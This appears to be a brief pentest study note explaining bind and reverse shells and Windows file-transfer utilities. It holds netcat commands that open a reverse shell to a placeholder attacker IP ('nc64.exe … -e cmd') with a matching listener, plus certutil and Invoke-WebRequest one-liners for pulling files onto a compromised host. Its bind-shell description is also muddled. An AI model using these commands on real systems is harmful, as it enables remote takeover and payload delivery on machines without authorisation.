### Bind Vs Reverse Shell
1. **Bind shell**
 - The attacker makes a client that listens for open ports coming from the compromised system, and the compromised system becomes the server.
```bash
  nc <target-ip> <port> 
```

2. **Reverse Shell**
  - The attacker becomes the server.
  - The compromised system becomes the client.

---

3. **Spawn Reverse Shells**
- On Windows machine execute:
```powershell
  .\nc64.exe <attacker-ip> 4444 -e cmd
```

- On Linux (attacker machine):
```bash
   nc -lnvp 4444
```
![](images/spwan.png)

---

### Transfer Files
1. Using **certutil** → it's a CMD utility for transferring files:
```cmd
   certutil -urlcache -split -f <url> <output-file>
```
![](images/cert1.png)

2. **iwr** → Invoke-WebRequest → This utility is used in PowerShell:
```powershell
  iwr -uri <url> -OutFile <output-file>
```